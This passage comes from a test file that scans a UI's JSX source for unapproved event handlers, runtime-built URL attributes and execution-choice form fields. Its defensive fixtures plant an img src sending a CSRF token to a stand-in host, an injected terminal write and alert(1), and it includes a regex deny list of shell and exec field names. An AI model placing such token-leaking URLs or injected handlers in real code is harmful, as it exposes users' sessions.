  })(syntax);
  return found;
}

function handlerPropsIn(text, file) {
  const syntax = parsedByExtension(text, file);
  const found = [];
  for (const element of intrinsicElementsIn(syntax)) {
    const tag = element.tagName.text;
    const className = classNameOf(element, syntax);
    for (const attribute of element.attributes.properties) {
      if (ts.isJsxSpreadAttribute(attribute)) {
        found.push({ tag, className, handler: '{...}' });
        continue;
      }
      if (!ts.isJsxAttribute(attribute)) continue;
      const name = attribute.name.getText(syntax);
      if (!/^on[A-Z]/.test(name) || name === 'onClick') continue;
      const value = attribute.initializer;
      const expression = value !== undefined && ts.isJsxExpression(value) && value.expression !== undefined
        ? value.expression.getText(syntax) : undefined;
      found.push({ tag, className, handler: name, expression });
    }
  }
  return found;
}

function intrinsicHandlersIn(syntax) {
  return intrinsicElementsIn(syntax).flatMap((element) => element.attributes.properties.flatMap((attribute) => {
    const name = ts.isJsxSpreadAttribute(attribute) ? '{...}' : attribute.name.getText(syntax);
    if (name !== '{...}' && !/^on[A-Z]/.test(name)) return [];
    const value = attribute.initializer;
    return [{ element, name, expression: value !== undefined && ts.isJsxExpression(value) ? value.expression : undefined }];
  }));
}

/** Whether an `ADMITTED_HANDLERS` rule covers this one found handler, on this file. */
function isAdmittedHandler(file, entry) {
  return ADMITTED_HANDLERS.some((rule) => rule.file === file && rule.tag === entry.tag
    && rule.handler === entry.handler
    && (rule.className === undefined || rule.className === entry.className)
    && (rule.expression === undefined || rule.expression === entry.expression));
}

/** An image file extension, which Vite resolves to a same-origin, build-time asset URL. */
const STATIC_ASSET_EXTENSION = /\.(?:png|jpe?g|gif|svg|webp|ico)$/;

/**
 * `syntax` was built with `setParentNodes: true`, so `ts.isImportClause`'s
 * `.parent` is its `ImportDeclaration`.
 */
function bindingNamesIn(syntax) {
  const bindings = [];
  (function walk(node) {
    if (ts.isImportClause(node) && node.name !== undefined) {
      const declaration = node.parent;
      const isAsset = ts.isImportDeclaration(declaration) && ts.isStringLiteral(declaration.moduleSpecifier)
        && STATIC_ASSET_EXTENSION.test(declaration.moduleSpecifier.text);
      bindings.push({ name: node.name.text, isAssetImport: isAsset });
    } else if ((ts.isImportSpecifier(node) || ts.isNamespaceImport(node) || ts.isVariableDeclaration(node)
      || ts.isParameter(node) || ts.isBindingElement(node) || ts.isFunctionDeclaration(node)
      || ts.isFunctionExpression(node) || ts.isClassDeclaration(node))
      && node.name !== undefined && ts.isIdentifier(node.name)) {
      bindings.push({ name: node.name.text, isAssetImport: false });
    }
    ts.forEachChild(node, walk);
  })(syntax);
  return bindings;
}

/**
 * Each value binding with the node that declares it: `bindingNamesIn`'s kinds
 * but a type-only import, plus enum and namespace declarations.
 */
function valueBindingsIn(syntax) {
  const bindings = [];
  (function walk(node) {
    if ((ts.isImportClause(node) || ts.isImportSpecifier(node)) && node.isTypeOnly) return;
    if ((ts.isImportClause(node) || ts.isImportSpecifier(node) || ts.isNamespaceImport(node)
      || ts.isVariableDeclaration(node) || ts.isParameter(node) || ts.isBindingElement(node)
      || ts.isFunctionDeclaration(node) || ts.isFunctionExpression(node) || ts.isClassDeclaration(node)
      || ts.isEnumDeclaration(node) || ts.isModuleDeclaration(node))
      && node.name !== undefined && ts.isIdentifier(node.name)) {
      bindings.push({ name: node.name.text, declaredBy: node });
    }
    ts.forEachChild(node, walk);
  })(syntax);
  return bindings;
}

/**
 * The scan does not resolve which declaration a use refers to, so a name is
 * admitted only when its static-asset import is the one binding of it that
 * `bindingNamesIn` finds.
 */
function staticAssetImportIdentifiersIn(syntax) {
  const bindings = bindingNamesIn(syntax);
  const occurrences = new Map();
  for (const { name } of bindings) occurrences.set(name, (occurrences.get(name) ?? 0) + 1);
  const admitted = new Set();
  for (const { name, isAssetImport } of bindings) {
    if (isAssetImport && occurrences.get(name) === 1) admitted.add(name);
  }
  return admitted;
}

/** The About link to the running version's release notes: a fixed GitHub path plus the daemon's version string. */
const ADMITTED_RELEASE_NOTES_HREF = 'releaseNotesUrl(report.about.daemon_version)';
const URL_ATTRIBUTES = new Set(['src', 'href', 'data', 'srcSet', 'poster', 'xlinkHref']);
// tsc refuses a namespaced JSX name, but the build emits it.
URL_ATTRIBUTES.add('xlink:href');

/**
 * A string-literal value (`src="/logo.png"`) is sent as written, so only an
 * expression can carry session material.
 */
function urlAttributesIn(text, file) {
  const syntax = parsedByExtension(text, file);
  const assets = staticAssetImportIdentifiersIn(syntax);
  const found = [];
  for (const element of intrinsicElementsIn(syntax)) {
    const tag = element.tagName.text;
    for (const attribute of element.attributes.properties) {
      if (!ts.isJsxAttribute(attribute)) continue;
      const name = attribute.name.getText(syntax);
      if (!URL_ATTRIBUTES.has(name)) continue;
      const value = attribute.initializer;
      if (value === undefined || !ts.isJsxExpression(value) || value.expression === undefined) continue;
      const expression = value.expression;
      if (ts.isIdentifier(expression) && assets.has(expression.text)) continue;
      if (file === SETTINGS_VIEW && expression.getText(syntax) === ADMITTED_RELEASE_NOTES_HREF) continue;
      found.push({ tag, name, expression: expression.getText(syntax) });
    }
  }
  return found;
}

test('the JSX url-attribute scan finds what it looks for, and does not cry wolf on a component prop, '
  + 'a testid or a bundled asset', () => {
  const fixture = `<>
    <img src={csrf} /><a href={csrf}>x</a><object data={csrf} /><img srcSet={csrf} />
    <video poster={csrf} /><use xlinkHref={csrf} />
  </>`;
  assert.deepEqual(
    urlAttributesIn(fixture, 'fixture.tsx').map((entry) => entry.name).sort(),
    ['data', 'href', 'poster', 'src', 'srcSet', 'xlinkHref'],
  );
  assert.deepEqual(urlAttributesIn('<use xlink:href={csrf} />', 'fixture.tsx').map((entry) => entry.name), ['xlink:href']);
  assert.deepEqual(urlAttributesIn('<Sparkline data={[1, 2, 3]} />', 'clean.tsx'), []);
  assert.deepEqual(urlAttributesIn('<div data-src={row.provider} />', 'clean.tsx'), []);
  assert.deepEqual(urlAttributesIn('<img src="/logo.png" />', 'clean.tsx'), []);
  assert.deepEqual(urlAttributesIn('<img src ={csrf} />', 'clean.tsx').map((entry) => entry.name), ['src']);
  assert.deepEqual(
    urlAttributesIn("import castUrl from './cast.png';\nconst x = <img src={castUrl} />;", 'clean.tsx'),
    [],
  );
  assert.deepEqual(
    urlAttributesIn(
      "import castUrl from './cast.png';\nconst x = <img src={`${castUrl}?c=${csrf}`} />;", 'plant.tsx',
    ).map((entry) => entry.name),
    ['src'],
  );
  assert.deepEqual(
    urlAttributesIn(
      "import castUrl from './cast.png';\nconst castUrl = `https://x.invalid/?c=${csrf}`;\n"
      + 'const x = <img src={castUrl} />;', 'shadow.tsx',
    ).map((entry) => entry.name),
    ['src'],
  );
  assert.deepEqual(
    urlAttributesIn(
      "import castUrl from './cast.png';\n"
      + 'function Portrait({ castUrl }) { return <img src={castUrl} />; }\n'
      + 'const x = <Portrait castUrl={`https://x.invalid/?c=${csrf}`} />;', 'shadow.tsx',
    ).map((entry) => entry.name),
    ['src'],
  );
});

test('the handler-prop scan finds what it looks for, and does not cry wolf on a component prop or onClick', () => {
  // The positive control: seven `on[A-Z]` props, plus a spread, which is
  // refused whatever it carries. `onDrag` is in no rule or list outside this
  // test: it shows the `on[A-Z]` match is by prefix, not by a list of names.
  const fixture = `<>
    <div onDoubleClick={a} onContextMenu={b} onFocus={c} onBlur={d} onWheel={e} onTouchStart={f} onDrag={g} />
    <div {...{ onDoubleClick: h }} />
  </>`;
  assert.deepEqual(
    handlerPropsIn(fixture, 'fixture.tsx').map((entry) => entry.handler).sort(),
    ['onBlur', 'onContextMenu', 'onDoubleClick', 'onDrag', 'onFocus', 'onTouchStart', 'onWheel', '{...}'],
  );
  // And it does not cry wolf: a component's own callback props, onClick, and
  // a spread onto a *component* (which decides for itself what it does with
  // its own props, named or spread) yield no entry.
  assert.deepEqual(
    handlerPropsIn(
      '<><OfficeCanvas onSelectAgent={i} onClose={j} onClear={k} {...rest} /><div onClick={h} /></>', 'clean.tsx',
    ),
    [],
  );
});

test('every handler prop other than onClick on a lowercase intrinsic tag under floor/src is admitted by file, '
  + 'element and name, or refused', async () => {
  const carrying = [];
  const seen = new Map();
  for (const path of await filesUnder(source, ['.tsx'])) {
    const relative = path.slice(floor.length + 1);
    const handlers = handlerPropsIn(await readFile(path, 'utf8'), relative);
    if (handlers.length > 0) seen.set(relative, handlers);
    for (const entry of handlers) {
      if (!isAdmittedHandler(relative, entry)) {
        const where = entry.className ? `<${entry.tag} className="${entry.className}">` : `<${entry.tag}>`;
        const named = entry.expression !== undefined ? `${entry.handler} = ${entry.expression}` : entry.handler;
        carrying.push(`${relative}: ${named} on ${where}`);
      }
    }
  }
  assert.deepEqual(carrying, [], 'the floor grew a handler prop this guard does not admit');
  // Each admission is for exactly what its element carries, and it does carry it.
  for (const rule of ADMITTED_HANDLERS) {
    const handlers = seen.get(rule.file) ?? [];
    assert.ok(
      handlers.some((entry) => entry.tag === rule.tag && entry.handler === rule.handler
        && (rule.className === undefined || entry.className === rule.className)
        && (rule.expression === undefined || entry.expression === rule.expression)),
      `${rule.file} was not scanned as itself for ${rule.handler} on <${rule.tag}>`,
    );
  }
});

test('terminal local handlers admit only the header shortcuts and native copy selection', async () => {
  const text = await readFile(resolve(floor, TERMINAL_PANEL), 'utf8');
  const handlers = handlerPropsIn(text, TERMINAL_PANEL);
  assert.equal(handlers.length, 3);
  assert.deepEqual(handlers.map((entry) => isAdmittedHandler(TERMINAL_PANEL, entry)), [true, true, true]);
  for (const [original, replacement] of [
    ["command(action);", "writeTerminal('injected');"],
    ['className="terminal-actions"', 'className="other-actions"'],
    ['event.currentTarget.select()', 'writeTerminal(event.currentTarget.value)'],
    ['onFocus={(event)', 'onChange={(event)'],
    ['<textarea readOnly', '<input readOnly'],
    ['screen.current === null && buttons?.length', 'buttons?.length'],
  ]) {
    assert.ok(text.includes(original), original);
    const planted = handlerPropsIn(text.replace(original, replacement), TERMINAL_PANEL);
    assert.ok(planted.some((entry) => !isAdmittedHandler(TERMINAL_PANEL, entry)), replacement);
  }
  assert.ok(handlerPropsIn(text, 'other.tsx').every((entry) => !isAdmittedHandler('other.tsx', entry)));
});

/** A named function expression binds its name inside itself. */
function enclosingFunctionOf(declaration) {
  return ts.findAncestor(ts.isFunctionExpression(declaration) ? declaration : declaration.parent,
    (node) => ts.isFunctionLike(node) || ts.isSourceFile(node));
}

/**
 * The identifiers a handler expression reads: each identifier but a member or
 * property name, a name it declares, and one inside a type node other than an
 * expression with type arguments, which holds runtime code.
 */
function namesReadIn(expression) {
  const names = [];
  (function walk(node) {
    if (ts.isTypeNode(node) && !ts.isExpressionWithTypeArguments(node)) return;
    const { parent } = node;
    if (ts.isIdentifier(node) && parent.propertyName !== node
      && (parent.name !== node || ts.isShorthandPropertyAssignment(parent))) names.push(node);
    ts.forEachChild(node, walk);
  })(expression);
  return names;
}

function unboundNamesIn(text, file) {
  const syntax = parsedByExtension(text, file);
  const bindings = valueBindingsIn(syntax)
    .map(({ name, declaredBy }) => ({ name, scope: enclosingFunctionOf(declaredBy) }));
  const found = [];
  let names = 0;
  for (const { name: handler, expression } of intrinsicHandlersIn(syntax)) {
    if (expression === undefined) continue;
    for (const name of namesReadIn(expression)) {
      names += 1;
      const count = bindings.filter((binding) => binding.name === name.text
        && ts.findAncestor(name, (at) => at === binding.scope) !== undefined).length;
      if (count !== 1) found.push(`${handler} = ${expression.getText(syntax)}: ${name.text} has ${count} bindings`);
    }
  }
  return { found, names };
}

test('every identifier namesReadIn lists for a handler prop on a lowercase intrinsic tag under floor/src is '
  + 'bound exactly once in the functions and module around it', async () => {
    const planted = unboundNamesIn(`
      import { send, submit, deps } from './send.ts';
      export function Strip({ rows, onPick }) {
        return <>{rows.map((row) => { const onPick = send; return <button onClick={() => onPick(row.id)} />; })}
          {rows.map((row, _index, _all, onPick = send) => <button onFocus={() => onPick(row.id)} />)}
          {rows.map((row) => { const deps = send; return <button onClick={() => void submit(row.id, deps)} />; })}
          {rows.map((row) => { enum deps { fetch } return <button onBlur={() => void submit(row.id, deps)} />; })}
          <button onClick={() => alert(1)} /></>;
      }
    `, 'planted.tsx');
    assert.deepEqual(planted.found, [
      'onClick = () => onPick(row.id): onPick has 2 bindings',
      'onFocus = () => onPick(row.id): onPick has 2 bindings',
      'onClick = () => void submit(row.id, deps): deps has 2 bindings',
      'onBlur = () => void submit(row.id, deps): deps has 2 bindings',
      'onClick = () => alert(1): alert has 0 bindings',
    ]);
    assert.deepEqual(unboundNamesIn('const x = <button onClick={() => void (alert(1), Array)<number>} />;', 'instantiation.tsx')
      .found, ['onClick = () => void (alert(1), Array)<number>: alert has 0 bindings',
      'onClick = () => void (alert(1), Array)<number>: Array has 0 bindings']);
    assert.deepEqual(unboundNamesIn("import { send } from './send.ts';\nnamespace send {}\n"
      + 'const x = <button onClick={() => send()} />;', 'namespace.tsx').found, ['onClick = () => send(): send has 2 bindings']);
    const clean = unboundNamesIn(`
      import type { Verb as onClose } from './types.ts';
      import { type Key as reveal } from './types.ts';
      function Roster({ onPick }) { return <button onClick={() => onPick({ id: 'a' })} />; }
      const go = function go() { return go; };
      export function Center({ onPick, onClose }) {
        function reveal(id) { return id; }
        return <><Roster onPick={onPick} />
          <button onKeyDown={(event: KeyboardEvent) => { if (event.repeat) event.preventDefault(); }}
            onFocus={() => reveal('a')} onBlur={go} onClick={onClose} /></>;
      }
    `, 'clean.tsx');
    assert.deepEqual(clean, { found: [], names: 6 });

    const found = [];
    let names = 0;
    for (const path of await filesUnder(source, ['.tsx'])) {
      const relative = path.slice(floor.length + 1);
      const scanned = unboundNamesIn(await readFile(path, 'utf8'), relative);
      names += scanned.names;
      found.push(...scanned.found.map((line) => `${relative}: ${line}`));
    }
    assert.ok(names >= 60, `the scan checked ${names} names, so it measured nothing`);
    assert.deepEqual(found, [], 'an identifier a handler prop reads is bound other than once in the functions and module around it');
  });

test('every src, href, data, srcSet, poster or xlinkHref attribute on a lowercase intrinsic tag under floor/src '
  + 'is a string, or a bundled asset', async () => {
  const carrying = [];
  for (const path of await filesUnder(source, ['.tsx'])) {
    const relative = path.slice(floor.length + 1);
    const found = urlAttributesIn(await readFile(path, 'utf8'), relative);
    for (const entry of found) {
      carrying.push(`${relative}: ${entry.name} = ${entry.expression} on <${entry.tag}>`);
    }
  }
  assert.deepEqual(carrying, [], 'a JSX attribute carries a runtime-built src, href, data, srcSet, poster or xlinkHref');
});

test('the scan finds what it looks for', () => {
  // The positive control, and it comes first on purpose: the assertions below
  // it check absences, and an absence is worth nothing until the same search has
  // been shown to return something.
  const fixture = `
    <form onSubmit={answer}><input value={draft} onChange={type} /></form>
    <button onClick={() => send({ type: 'agent.answer' })}>Answer</button>
    <textarea oninput="x()"></textarea><select onchange="y()"></select>
    <a href="/answer">answer</a><div contenteditable="true" onKeyDown={k}
      onMouseDown={m} onPointerDown={p} onclick="z()"></div>
    node.ondblclick = () => {};
    document.querySelector('.answer-send')?.click();
  `;
  assert.deepEqual(
    controlsIn(fixture).sort(),
    FORBIDDEN.map(([name]) => name).sort(),
    'a pattern in FORBIDDEN no longer matches the thing it names',
  );
  // And it does not cry wolf over the floor's own vocabulary.
  assert.deepEqual(controlsIn('const canvas = <canvas ref={ref} />;'), []);
  assert.deepEqual(controlsIn("socket.addEventListener('message', read);"), []);
  assert.deepEqual(controlsIn('current.onboarding === next.onboarding'), []);
  assert.deepEqual(controlsIn('next.onboarding = null;'), []);
  for (const [spelling, kind] of [
    ['image.onerror = f;', DOM_HANDLER],
    ['node.ontouchstart = f;', DOM_HANDLER],
    ['node.onclick ??= f;', DOM_HANDLER],
    ['document.onbeforepaste = f;', DOM_HANDLER],
    ["node.dispatchEvent(new MouseEvent('click'));", ACTIVATION],
    ['form.requestSubmit();', ACTIVATION],
    ["document.designMode = 'on';", 'an editable region'],
    ['.note { -webkit-user-modify: read-write; }', 'an editable region'],
  ]) {
    assert.deepEqual(controlsIn(spelling), [kind], `${spelling} is not found`);
  }
  assert.ok(DOM_HANDLER_NAMES.size >= 200, `only ${DOM_HANDLER_NAMES.size} DOM handler names were read`);
  for (const field of FLOOR_DATA_FIELDS) {
    assert.match(field, /^on[a-z]+$/, `${field} is not one on[a-z]+ name, and it is joined into the rule unescaped`);
    assert.ok(!DOM_HANDLER_NAMES.has(field), `${field} is a DOM handler, so it cannot be a Floor data field`);
  }
});

test('the floor admits only the named controls and forms', async () => {
  const sources = await filesUnder(source, ['.ts', '.tsx', '.css', '.html']);
  assert.ok(sources.length >= 10, `only ${sources.length} source files were scanned`);

  const carrying = [];
  const admitted = new Map();
  for (const path of sources) {
    const relative = path.slice(floor.length + 1);
    let found = controlsIn(await readFile(path, 'utf8'));
    const allowed = [...(ADMITTED.get(relative) ?? []), ...(ADMITTED_WITHOUT_HANDLER.get(relative) ?? [])];
    if (allowed.length > 0) {
      admitted.set(relative, found);
      found = found.filter((name) => !allowed.includes(name));
    }
    if (found.length > 0) carrying.push(`${relative}: ${found.join(', ')}`);
  }
  assert.deepEqual(carrying, [], 'the floor grew a mutation control');
  // Each exemption is for exactly what its form carries, and it does carry it.
  for (const [file, kinds] of [...ADMITTED, ...ADMITTED_WITHOUT_HANDLER]) {
    assert.deepEqual((admitted.get(file) ?? []).sort(), [...kinds].sort(), `${file} was not scanned as itself`);
  }
  const byFile = (map) => [...map].map(([file, kinds]) => `${file}: ${[...kinds].sort().join(', ')}`).sort();
  assert.deepEqual(byFile(ADMITTED_BY_RULES), byFile(ADMITTED),
    "a file's ADMITTED list is not the FORBIDDEN kinds its ADMITTED_HANDLERS rules name");
});

function fieldsIn(text) {
  const syntax = ts.createSourceFile('form.tsx', text, ts.ScriptTarget.Latest, true, ts.ScriptKind.TSX);
  assert.deepEqual(syntax.parseDiagnostics, [], 'the form source no longer parses');
  const fields = [];
  function attribute(node, name) {
    const found = node.attributes.properties
      .find((entry) => ts.isJsxAttribute(entry) && entry.name.getText(syntax) === name);
    if (found === undefined) return null;
    const value = found.initializer;
    if (value === undefined) return '';
    if (ts.isStringLiteral(value)) return value.text;
    return value.expression?.getText(syntax) ?? value.getText(syntax);
  }
  function collect(node) {
    if ((ts.isJsxSelfClosingElement(node) || ts.isJsxOpeningElement(node))
      && ['input', 'textarea', 'select'].includes(node.tagName.getText(syntax))) {
      fields.push({
        tag: node.tagName.getText(syntax),
        name: attribute(node, 'name'),
        type: attribute(node, 'type'),
        change: attribute(node, 'onChange'),
      });
    }
    ts.forEachChild(node, collect);
  }
  collect(syntax);
  return fields;
}

/** Substrings a Hire field's `name` must not contain; each names a way to choose how an agent runs. */
const EXECUTION_CHOICE =
  /cwd|command|argv|exec|provider|engine|model|predicate|check|budget|ceiling|usd|hop|isolat|trust|path|folder|dir|file|repo|env|shell/i;

test('the Hire form has exactly eight named fields, and no field name but workspace_id, engine and check_id matches '
  + 'EXECUTION_CHOICE', async () => {
  // The control first: a planted path field and a file picker are both seen.
  const planted = fieldsIn(`const x = <><input name="cwd" onChange={(event) => set(event)} />
    <input type="file" name="profile" /></>;`);
  assert.equal(planted.length, 2);
  assert.ok(EXECUTION_CHOICE.test(planted[0].name), 'a planted cwd field is not recognised');
  assert.equal(planted[1].type, 'file');

  const form = await readFile(resolve(floor, HIRE_FORM), 'utf8');
  const fields = fieldsIn(form);
  assert.deepEqual(fields.map(({ tag, name, type }) => `${tag}:${name}:${type ?? ''}`).sort(),
    HIRE_FIELDS.map(({ tag, name, type }) => `${tag}:${name}:${type ?? ''}`).sort(),
    'the Hire form grew, lost or renamed a field');
  for (const field of fields) {
    assert.ok(['workspace_id', 'engine', 'check_id'].includes(field.name) || !EXECUTION_CHOICE.test(field.name),
      `${field.name} is an execution choice`);
    assert.notEqual(field.type, 'file', 'the Hire form carries a file picker');
    assert.notEqual(field.type, 'hidden', 'the Hire form carries a hidden field');
  }
  assert.deepEqual(fields.map((field) => field.change).sort(), HIRE_FIELDS.map((field) => field.change).sort(),
    'a Hire field writes somewhere other than its own draft value');
  assert.deepEqual(fields.map(({ name, change }) => `${name}: ${change}`).sort(),
    HIRE_FIELDS.map(({ name, change }) => `${name}: ${change}`).sort(),
    "a Hire field's change handler is not the one pinned for that field");
  // Each choice's value comes from what the daemon offered: a workspace from
  // `catalog.workspaces`, an engine from that workspace's `engines`, and a
  // check from that workspace's enrolled `checks`.
  assert.match(form, /<input type="radio" name="workspace_id" value=\{space\.workspaceId\}/);
  assert.match(form, /catalog\.workspaces\.map\(\(space\) =>/);
  assert.match(form, /<input type="radio" name="engine" value=\{name\}/);
  assert.match(form, /workspace\.engines\.map\(\(name\) =>/);
  assert.match(form, /<input type="radio" name="check_id" value=\{option\.id\}/);
  assert.match(form, /checks\.map\(\(option\) =>/);
  assert.match(form, /const checks = workspace === null \? null : checksFor\(floor\.checks, workspace\.workspaceId\);/);
});

test("the answer form has exactly one field and its field and Send key handlers are pinned by text", async () => {
  const form = await readFile(resolve(floor, ANSWER_FORM), 'utf8');
  const fields = fieldsIn(form);
  assert.deepEqual(fields.map(({ tag, name, type }) => `${tag}:${name}:${type ?? ''}`), ['textarea:answer:'],
    'the answer form grew, lost or renamed a field');
  assert.equal(fields[0].change, '(event) => editAnswerDraft(gate.agent, gate.questionLsn, event.target.value)',
    "the answer field's change handler is not the pinned editAnswerDraft call");
  const keys = [];
  const syntax = ts.createSourceFile('form.tsx', form, ts.ScriptTarget.Latest, true, ts.ScriptKind.TSX);
  (function collect(node) {
    if (ts.isJsxAttribute(node) && /^onKey/.test(node.name.getText(syntax))) {
      keys.push(`${node.name.getText(syntax)}=${node.initializer.expression.getText(syntax)}`);
    }
    ts.forEachChild(node, collect);
  })(syntax);
  assert.deepEqual(keys, [
    'onKeyDown=(event) => { if (sendsOnKey(event)) void submitAnswer(gate, browserAnswerDeps); }',
    'onKeyDown=(event) => { if (event.repeat) event.preventDefault(); }',
  ]);
});

test('the goal form has one text field, named goal, and one check choice, each with a pinned change handler', async () => {
  const form = await readFile(resolve(floor, GOAL_PANEL), 'utf8');
  const fields = fieldsIn(form);
  assert.deepEqual(fields.map(({ tag, name, type, change }) => [`${tag}:${name}:${type ?? ''}`, change]), [
    ['input:goal_check:radio', "() => choose('keep')"],
    ['input:goal_check:radio', '() => choose({ id: option.id })'],
    ['textarea:goal:', '(event) => editGoalDraft(gate.agent, gate.goal, event.target.value)'],
  ], 'the goal form grew, lost or renamed a field, or a field writes somewhere other than its pinned call');
  // The choice is Keep or one of the checks the daemon offered for the agent's workspace, and it writes only the
  // unsent choice, and only while the form is not held.
  assert.match(form, /gate\.enrolled\.map\(\(option\) =>/);
  assert.match(form, /const choose = \(choice: CheckChoice\) => \{\s*if \(!blocked\) chooseGoalCheck\(gate\.agent, gate\.goal, choice\);\s*\};/);
});

test('the only activators are named selection, retry, view, Hire, answer, Chat, pause, Pause all, resume, goal change, look edit and dismiss buttons, '
  + 'the office\'s speech marks and its two turn and two zoom buttons, the terminal\'s Attach, Detach, Close, zoom, copy and expand, Retire\'s own four, the Git tab\'s Refresh and Copy path, '
  + 'the Memory tab\'s Refresh, Try again, Load older entries and Read whole entry, Setup\'s Recheck, Copy and guide opener, '
  + 'Settings\' office layout and desktop notification choices, the guide\'s navigation and Hire opener, '
  + 'and checkout differences\' explicit show, refresh, hide, open and more-files controls', async () => {
  const buttons = [];
  const clicks = [];
  for (const path of await filesUnder(source, ['.ts', '.tsx', '.html'])) {
    const relative = path.slice(floor.length + 1);
    const text = await readFile(path, 'utf8');
    buttons.push(...[...text.matchAll(/<button[\s/>]/gi)].map(() => relative));
    clicks.push(...[...text.matchAll(/\bonclick\s*=/gi)].map(() => relative));
  }
  const expected = [
    'src/renderer/AgentDetail.tsx',
    ...Array(2).fill('src/renderer/CrewList.tsx'),
    ...Array(3).fill(ARCHIVED_AGENTS),
    ...Array(7).fill('src/renderer/Control.tsx'),
    'src/renderer/DoneNotices.tsx',
    ...Array(3).fill('src/renderer/LiveWork.tsx'),
    'src/renderer/BoardNotes.tsx',
    ...Array(6).fill('src/renderer/OfficeCanvas.tsx'),
    'src/renderer/ReadError.tsx',
    ...Array(4).fill(ANSWER_FORM),
    ...Array(8).fill(CHAT_PANEL),
    ...Array(4).fill(CONTROL_PANEL),
    ...Array(5).fill(PAUSE_ALL_PANEL),
    ...Array(3).fill(GOAL_PANEL),
    ...Array(2).fill('src/renderer/ticket/TicketBanner.tsx'),
    ...Array(6).fill(TICKET_BOARD),
    ...Array(10).fill(TICKET_PANEL),
    ...Array(10).fill(HIRE_FORM),
    HIRE_ENTRY,
    ...Array(6).fill(RETIRE_PANEL),
    ...Array(2).fill(GIT_PANEL),
    ...Array(5).fill(DIFF_PANEL),
    ...Array(4).fill(MEMORY_PANEL),
    ...Array(4).fill(RENAME_PANEL),
    ...Array(4).fill(LOOK_PANEL),
    ...Array(3).fill(SETUP_VIEW),
    ...Array(5).fill(SETTINGS_VIEW),
    ...Array(7).fill(FIRST_RUN_GUIDE),
    ...Array(10).fill(TERMINAL_PANEL),
    ...Array(4).fill('src/shell.tsx'),
  ];
  assert.deepEqual(buttons.sort(), [...expected, AGENT_ORDER].sort());
  expected.sort();
  const clickExpected = [...expected];
  clickExpected.splice(clickExpected.indexOf(LOOK_PANEL), 1);
  // The two ticket forms each submit with a button that has no click handler of its own.
  clickExpected.splice(clickExpected.indexOf(TICKET_BOARD), 1);
  clickExpected.splice(clickExpected.indexOf(TICKET_PANEL), 1);
  clickExpected.splice(clickExpected.indexOf(TICKET_PANEL), 1);
  assert.deepEqual(clicks.sort(), clickExpected.sort());
  const readError = await readFile(resolve(source, 'renderer/ReadError.tsx'), 'utf8');
  assert.deepEqual(clicksIn(readError), ['onRetry']);
  assert.match(readError, /onRetry = refreshFloorSnapshot/);
  const archive = await readFile(resolve(floor, ARCHIVED_AGENTS), 'utf8');
  assert.deepEqual(clicksIn(archive), [
    '() => setShowHidden((value) => !value)',
    '(event) => onHireAgain(row, event.currentTarget)',
    '() => hide(row.id, !hidden.includes(row.id))',
  ]);
  assert.deepEqual(clicksIn(await readFile(resolve(floor, LOOK_PANEL), 'utf8')), [
    '() => beginLook(row)', 'cancelLook', '() => { void checkLook(browserLookDeps); }',
  ]);
  const archiveSyntax = parsedByExtension(archive, ARCHIVED_AGENTS);
  assert.deepEqual(archiveSyntax.statements.filter(ts.isImportDeclaration).map((node) =>
    [node.moduleSpecifier.text, node.importClause?.isTypeOnly]), [
    ['react', false], ['./archive.ts', true], ['./appearance.ts', false], ['./Portrait.tsx', false],
    ['./format.ts', false], ['./worktree.ts', false], ['./ReadError.tsx', false],
    ['./floor/reads.ts', false], ['./floor/store.ts', true],
    ['./scene/label.ts', false], ['./onboarding/HireEntry.tsx', false], ['./memory/MemoryPanel.tsx', false], ['./view.ts', false],
  ]);
  const shell = await readFile(resolve(floor, FLOOR_SHELL), 'utf8');
  assert.match(shell, /onHireAgain=\{hireAgain\}/);
  assert.match(shell, /function hireAgain\(row: RetiredAgentRow, opener: HTMLButtonElement\): void \{\s*backdropPress\.current = null;\s*hireOpener\.current = opener;\s*setArchiveHireKept\(!prepareArchiveHire\(row, floor\)\);\s*setGuide\('closed'\);\s*setHiring\(true\);\s*\}/);
  const canvas = await readFile(resolve(source, 'renderer/OfficeCanvas.tsx'), 'utf8');
  const strip = await readFile(resolve(source, 'renderer/CrewList.tsx'), 'utf8');
  const center = await readFile(resolve(source, 'renderer/Control.tsx'), 'utf8');
  assert.match(canvas, /type="button"/);
  assert.match(canvas, /className="agent-select"/);
  assert.match(canvas, /onClick=\{\(\) => onSelectAgent\(id\)\}/);
  assert.deepEqual(clicksIn(canvas), ['() => turn(TURN_STEP)', '() => turn(-TURN_STEP)', '() => zoom(ZOOM_STEP)', '() => zoom(1 / ZOOM_STEP)',
    '() => onSelectAgent(id)', '() => onOpenQuestion(id)']);
  const notes = await readFile(resolve(floor, 'src/renderer/BoardNotes.tsx'), 'utf8');
  assert.match(notes, /className="board-select"/);
  assert.match(notes, /onClick=\{onOpenTasks\}/);
  const tasks = await readFile(resolve(floor, 'src/renderer/ticket/TicketBoard.tsx'), 'utf8');
  assert.match(tasks, /onClick=\{\(event\) => onSelect\(card\.id, event\.currentTarget\)\}/);
  assert.match(center, /onSelect=\{openCard\}/);
  assert.match(strip, /className="crew-row"/);
  assert.match(strip, /onClick=\{\(\) => onSelectAgent\(row\.id\)\}/);
  assert.match(strip, /className="crew-card-note"/);
  assert.match(strip, /className="crew-card-note"[\s\S]*?disabled=\{!selectable\}/);
  assert.match(strip, /onClick=\{\(\) => \{\s*if \(crew\.activeCard !== null\) onOpenCard\(crew\.activeCard\.id\);\s*\}\}/);
  assert.deepEqual(clicksIn(strip).map((handler) => handler.replace(/\s+/g, ' ')), [
    '() => onSelectAgent(row.id)',
    '() => { if (crew.activeCard !== null) onOpenCard(crew.activeCard.id); }',
  ]);
  assert.match(center, /className="agents-roster-row"/);
  assert.match(center, /onClick=\{\(\) => onSelectAgent\(row\.id\)\}/);
  assert.deepEqual(clicksIn(center), ['() => onSelectAgent(row.id)', 'onToggle', '() => onOpen(item.agentId)',
    '() => onOpenTicket?.(item.card)', '() => onToggle(entry.view)', 'onClose', 'closeOverlay']);
  assert.deepEqual(clicksIn(await readFile(resolve(floor, TICKET_BOARD), 'utf8')), [
    '() => dismissNotice(notice)', '(event) => onHire(event.currentTarget)', 'onCancel',
    '(event) => onSelect(card.id, event.currentTarget)', '(event) => onNewTicket(event.currentTarget)',
  ]);
  // Opening Setup or Settings takes a fresh snapshot: the same resubscription Recheck starts.
  assert.match(center, /\{ view: 'setup', label: 'Setup', refresh: true \}/);
  assert.match(center, /\{ view: 'settings', label: 'Settings', refresh: true \}/);
  assert.match(center, /onSetup=\{\(\) => onView\('setup'\)\}/);
